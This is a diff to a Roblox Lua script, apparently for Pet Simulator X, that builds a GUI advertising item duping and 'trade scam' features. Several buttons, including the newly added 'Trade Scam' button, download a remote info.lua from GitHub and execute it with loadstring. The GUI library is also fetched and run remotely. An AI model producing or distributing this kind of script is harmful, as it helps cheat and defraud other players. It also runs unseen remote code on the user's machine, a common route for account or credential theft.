@@ -1,8 +1,7 @@
-if game.PlaceId == 6284583030 then
-    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Maset0/PSX/main/GUI.lua')))()
-    local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE 3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-    
-    local Tab = Window:MakeTab({
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE V3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
         Name = "Info",
         Icon = "rbxassetid://4483345998",
         PremiumOnly = false
@@ -14,22 +13,14 @@ if game.PlaceId == 6284583030 then
     
     Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")
 
-    Tab:AddButton({
-        Name = "Button!",
-        Callback = function()
-            loadstring(game:HttpGet("https://discord.gg/QVqBv5T9s9"))()
-          end    
-    })
-
       local Tab = Window:MakeTab({
         Name = "Dupe",
         Icon = "rbxassetid://4483345998",
         PremiumOnly = false
     })
     
-    
     Tab:AddLabel("DUPE STATUS:WORKING")
-
+    
     local Section = Tab:AddSection({
         Name = "Dupe Section"
     })
@@ -39,9 +30,9 @@ if game.PlaceId == 6284583030 then
         Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
           end    
-    })    
+    })
     
-    Tab:AddTextbox({
+     Tab:AddTextbox({
         Name = "Rename all pets",
         Default = "Text Goes here",
         TextDisappear = true,
@@ -50,7 +41,6 @@ if game.PlaceId == 6284583030 then
         end	  
     })
     
-
     local Tab = Window:MakeTab({
         Name = "Trade Scam",
         Icon = "rbxassetid://4483345998",
@@ -61,13 +51,13 @@ if game.PlaceId == 6284583030 then
 
     local Section = Tab:AddSection({
 	Name = "Trade Scam Section"
-})
+    })
 
-    Tab:AddToggle({
+    Tab:AddButton({
         Name = "Trade Scam",
         Default = false,
         Callback = function(Value)
-            print(Value)
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
         end    
     })
 
@@ -76,19 +66,7 @@ if game.PlaceId == 6284583030 then
 	Callback = function()
         print(Value)
   	end    
-})
+    })
+    
+    
 
-
-
-
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    end
-    OrionLib:Init()
